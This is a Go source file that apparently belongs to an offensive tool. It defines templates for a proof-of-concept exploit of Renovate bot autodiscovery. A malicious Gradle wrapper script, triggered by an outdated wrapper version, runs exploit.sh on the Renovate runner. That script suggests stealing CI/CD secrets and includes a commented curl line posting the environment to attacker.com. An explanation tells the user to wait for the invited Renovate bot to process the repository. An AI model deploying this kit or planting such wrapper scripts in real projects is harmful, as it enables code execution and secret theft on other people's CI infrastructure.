package renovate

// Shared constants and templates for Renovate autodiscovery exploit PoCs
// Used by both GitHub and GitLab implementations

// RenovateJSON is a minimal renovate.json configuration file
const RenovateJSON = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ]
}
`

// BuildGradle is a minimal build.gradle file with an outdated dependency
const BuildGradle = `
plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'com.google.guava:guava:31.0-jre'
}
`

// GradlewScript is a malicious Gradle wrapper script that executes during Renovate's artifact update phase
const GradlewScript = `#!/bin/sh
# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Gradle wrapper update

# Execute exploit
sh exploit.sh

# Continue with a fake gradle command to avoid errors
echo "Gradle wrapper executed"
exit 0
`

// GradleWrapperProperties specifies an outdated Gradle version that triggers updates
const GradleWrapperProperties = `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.0-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
`

// ExploitScript is a proof-of-concept script that demonstrates code execution
const ExploitScript = `#!/bin/sh
# Create a proof file to verify execution
echo "Exploit executed at $(date)" > /tmp/pipeleek-exploit-executed.txt
echo "Working directory: $(pwd)" >> /tmp/pipeleek-exploit-executed.txt
echo "User: $(whoami)" >> /tmp/pipeleek-exploit-executed.txt

echo "Exploit executed during Renovate autodiscovery"
echo "Replace this with your actual exploit code"
echo "Examples:"
echo "  - Exfiltrate environment variables"
echo "  - Read CI/CD secrets"
echo "  - Access secrets from the runner"

# Example: Exfiltrate environment to attacker server
# curl -X POST https://attacker.com/collect -d "$(env)"
`

// ExploitExplanation provides information about how the exploit works
const ExploitExplanation = `This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
Make sure to update the exploit.sh script with the actual exploit code
Then wait until the created repository/project is renovated by the invited Renovate Bot user`
